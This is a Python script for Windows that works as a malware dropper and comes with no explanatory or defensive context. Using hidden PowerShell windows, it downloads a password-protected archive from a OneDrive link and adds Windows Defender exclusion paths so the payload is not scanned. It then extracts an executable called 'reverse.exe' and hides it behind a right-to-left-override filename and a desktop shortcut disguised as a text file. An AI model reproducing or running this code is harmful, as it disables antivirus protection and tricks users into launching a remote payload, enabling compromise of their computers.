import subprocess
import os
import winshell
import appdirs
import py7zr

file_urls = [
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdoyRqvTBoHb6VbXjt/root/content", "C:\\Reverse.7z")
]


def run_hidden(cmd):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return subprocess.run(cmd, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def download(url, save_path):
    powershell_cmd = [
        f"Invoke-WebRequest -Uri '{url}' -OutFile '{save_path}'"
    ]
    full_cmd = ["powershell", "-ExecutionPolicy", "Bypass" , "-Command", ";".join(powershell_cmd)]
    run_hidden(full_cmd)

def add_exclusion(path):
    powershell_cmd = [
        f'Add-MpPreference -ExclusionPath "{path}"'
    ]
    full_cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ";".join(powershell_cmd)]
    run_hidden(full_cmd)

for url, save_path in file_urls:
    download(url, save_path)

zip_file="C:\\Reverse.7z"
zip_content="C:\\reverse.exe"
destination_dir= appdirs.user_data_dir()
destination_file = "Revers\u202Etxt.exe"
destination_path = os.path.join(destination_dir, destination_file)
shortcut_path=os.path.expanduser("~\\Desktop")
icon_path = "C:\\Windows\\system32\\shell32.dll"

powershell_cmds = [
    f'Add-MpPreference -ExclusionPath "{zip_content}"',
    f'Add-MpPreference -ExclusionPath "{destination_path}"',
    f'Add-MpPreference -ExclusionPath "{shortcut_path}"'
]

for cmd in powershell_cmds:
    subprocess.Popen(["powershell.exe", "-WindowStyle", "Hidden", "-Command", cmd])

exclusion_paths = [zip_content, destination_path, shortcut_path]
for path in exclusion_paths:
    add_exclusion(path)

with py7zr.SevenZipFile(zip_file, mode='r', password='password') as z:
    z.extractall(path="C:\\")

if os.path.exists(destination_path):
    os.remove(destination_path)
os.rename("C:\\reverse.exe", destination_path)

shortcut_name = "Reverse.txt.lnk"
shortcut_path = os.path.join(winshell.desktop(), shortcut_name)
icon_path = "C:\\Windows\\system32\\shell32.dll"

winshell.CreateShortcut(
    Path=shortcut_path,
    Target=destination_path,
    Icon=(icon_path,70)
)